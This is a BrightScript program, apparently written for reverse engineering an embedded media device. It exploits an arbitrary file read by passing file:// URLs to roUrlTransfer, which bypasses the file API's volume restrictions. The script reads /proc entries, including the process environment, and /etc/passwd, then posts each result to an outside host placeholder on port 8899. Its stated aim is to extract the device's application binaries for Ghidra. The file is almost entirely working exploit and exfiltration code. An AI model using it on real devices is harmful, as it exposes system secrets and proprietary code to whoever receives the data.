' FILEREAD — arbitrary file read via roUrlTransfer with file:// URLs.
'
' Method is public prior art: the BrightScript file APIs map only four volumes and
' reject absolute paths ("Missing or invalid PHY"), but the URL/network layer does
' not apply that mapping. Feeding a file:// URL to roUrlTransfer reads the real
' filesystem.
'
' Goal: pull /proc/* to learn the rootfs layout, kernel and mount table, then
' extract /bin/Application and the .so files for Ghidra.
'
' No identifier may collide with a BrightScript builtin (pos, log, len ...).

sub main()
    print "[FR] ===== start ====="

    targets = [
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/self/maps",
        "/proc/self/environ",
        "/etc/passwd"
    ]

    for each name in targets
        body = ReadUrl("file://" + name)
        size = -1
        if body <> invalid then size = body.Len()
        print "[FR] "; name; " -> len="; size
        Post(name, body)
    end for

    ' Binary-capable path: GetToFile survives null bytes, GetToString does not.
    print "[FR] test GetToFile"
    saved = TryToFile("file:///proc/version", "tmp:/v.txt")
    print "[FR] GetToFile="; saved
    back = ReadUrl("file://tmp:/v.txt")
    if back <> invalid then print "[FR] readback len="; back.Len()

    print "[FR] ===== end ====="
    Idle()
end sub

function ReadUrl(u as string) as dynamic
    try
        x = CreateObject("roUrlTransfer")
        x.SetUrl(u)
        return x.GetToString()
    catch e
        return invalid
    end try
end function

function TryToFile(u as string, dest as string) as dynamic
    try
        x = CreateObject("roUrlTransfer")
        x.SetUrl(u)
        return x.GetToFile(dest)
    catch e
        return "THROW"
    end try
end function

sub Post(label as string, body as dynamic)
    msg = label + "|"
    if body = invalid then
        msg = msg + "<invalid>"
    else
        msg = msg + body
    end if
    try
        p = CreateObject("roUrlTransfer")
        p.SetUrl("http://HOST_IP_EN0:8899/report")
        p.SetPort(CreateObject("roMessagePort"))
        p.PostFromString(msg)
    catch e
        print "[FR] post threw"
    end try
end sub

sub Idle()
    port = CreateObject("roMessagePort")
    while true
        wait(2000, port)
    end while
end sub
